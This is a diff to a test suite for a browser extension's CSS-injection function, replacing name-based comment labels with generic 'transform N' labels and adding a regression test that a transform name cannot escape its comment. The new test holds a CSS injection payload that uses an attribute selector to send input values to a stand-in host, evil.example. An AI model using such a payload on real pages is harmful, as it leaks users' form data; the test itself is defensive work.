@@ -405,7 +405,7 @@ describe('applyCssTransforms', () => {
       ],
       URL_ON_PAGE,
     )
-    expect(log).toEqual([`insert:1:/* good */\n${GOOD_CSS}`])
+    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}`])
   })
 
   it('inserts nothing when the tab no longer shows the page, and inserts when it does', async () => {
@@ -414,7 +414,20 @@ describe('applyCssTransforms', () => {
     await applyCssTransforms(deps, 1, css, URL_ON_PAGE, async () => false)
     expect(log).toEqual([])
     await applyCssTransforms(deps, 1, css, URL_ON_PAGE, async () => true)
-    expect(log).toEqual([`insert:1:/* good */\n${GOOD_CSS}`])
+    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}`])
+  })
+
+  it('does not put a transform name into the inserted CSS (#145)', async () => {
+    const hostile = 'x */ input[value^="a"]{background:url(https://evil.example/a)} /*'
+    const { deps, log } = cssDeps()
+    await applyCssTransforms(
+      deps,
+      1,
+      [transform({ id: 'a', kind: 'css', code: 'aside{display:none}', name: hostile })],
+      URL_ON_PAGE,
+    )
+    expect(log).toEqual(['insert:1:/* transform 1 */\naside{display:none}'])
+    expect(log.join('')).not.toContain('evil.example')
   })
 
   it('injects nothing when every stored rule fails', async () => {
@@ -461,7 +474,7 @@ describe('applyCssTransforms', () => {
       ],
       URL_ON_PAGE,
     )
-    expect(log).toEqual([`insert:1:/* here */\n${GOOD_CSS}\n\n/* any */\n${GOOD_CSS}`])
+    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}\n\n/* transform 2 */\n${GOOD_CSS}`])
   })
 
   it('leaves out restricted CSS when the tab container cannot be read (#127)', async () => {
